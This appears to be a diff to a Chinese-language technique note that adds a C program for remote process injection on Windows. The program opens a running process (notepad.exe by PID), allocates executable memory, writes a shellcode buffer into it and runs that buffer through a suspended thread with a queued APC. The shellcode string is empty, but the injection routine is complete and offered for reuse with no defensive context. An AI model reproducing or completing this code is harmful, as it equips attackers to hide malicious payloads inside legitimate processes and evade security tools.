@@ -47,5 +47,40 @@ int main() {
 }
 ```
 
+* 远程注入:
+
+```text
+#include<Windows.h>
+#include<stdio.h>
+
+char shellcode[] = 
+"";
+
+int main() {
+
+	HANDLE hThread = NULL;
+	HANDLE hProcess = 0;
+	DWORD ProcessId = 0;
+	LPVOID AllocAddr = NULL;
+
+
+	//hProcess = GetCurrentProcess();
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, 12524);//notepad.exe
+	AllocAddr = VirtualAllocEx(hProcess, 0, sizeof(shellcode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(hProcess, AllocAddr, shellcode, sizeof(shellcode) + 1, 0);
+
+
+	hThread = CreateRemoteThread(hProcess,0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);
+
+	QueueUserAPC((PAPCFUNC)AllocAddr, hThread, 0);
+	ResumeThread(hThread);
+	//WaitForSingleObject(hThread,INFINITE);
+	CloseHandle(hProcess);
+	CloseHandle(hThread);
+	return 0;
+
+}
+```
+
 ![](../.gitbook/assets/image%20%2822%29.png)
 
